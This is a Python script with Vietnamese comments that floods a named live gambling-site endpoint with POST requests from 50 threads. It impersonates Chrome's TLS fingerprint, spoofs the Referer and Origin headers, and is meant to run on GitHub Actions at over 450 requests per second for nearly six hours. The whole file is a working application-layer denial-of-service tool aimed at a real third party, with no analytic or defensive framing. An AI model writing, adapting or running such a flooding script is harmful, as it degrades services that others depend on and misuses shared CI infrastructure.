from curl_cffi import requests
import threading
import time
import random

# --- CẤU HÌNH ---
TARGET_URL = "https://iloto88.info/UserService.aspx"
THREADS_COUNT = 50 # GitHub Actions có CPU rất mạnh, 50 luồng là đủ đạt 450+ RPS

stats = {"ok": 0, "err": 0}
lock = threading.Lock()

def worker():
    global stats
    # Sử dụng Session để giữ kết nối HTTP/2 lâu dài
    with requests.Session() as s:
        payload = "id=208&flag=SysMsgBean_showmsg"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://loto188.plus/",
            "Origin": "https://loto188.plus"
        }
        
        while True:
            try:
                # Bắn liên tục 50 phát trên mỗi phiên để tối đa hóa tốc độ
                for _ in range(50):
                    resp = s.post(TARGET_URL, data=payload, headers=headers, impersonate="chrome120", timeout=10)
                    with lock:
                        if resp.status_code == 200 and "applied" in resp.text:
                            stats["ok"] += 1
                        else:
                            stats["err"] += 1
                # Nghỉ ngắn để reset kết nối nếu cần
                time.sleep(0.1)
            except:
                with lock: stats["err"] += 1
                time.sleep(1)

def monitor():
    while True:
        time.sleep(1)
        with lock:
            print(f"[{time.strftime('%H:%M:%S')}] RPS: {stats['ok']} | Lỗi: {stats['err']}")
            stats["ok"] = 0
            stats["err"] = 0

if __name__ == "__main__":
    # Khởi chạy luồng giám sát (sẽ hiển thị trong tab Actions của GitHub)
    threading.Thread(target=monitor, daemon=True).start()
    
    # Khởi chạy các luồng tải
    for _ in range(THREADS_COUNT):
        threading.Thread(target=worker, daemon=True).start()
    
    # GitHub Actions sẽ chạy tối đa 6 tiếng trước khi tự khởi động lại
    time.sleep(21000) # Chạy khoảng 5.8 tiếng
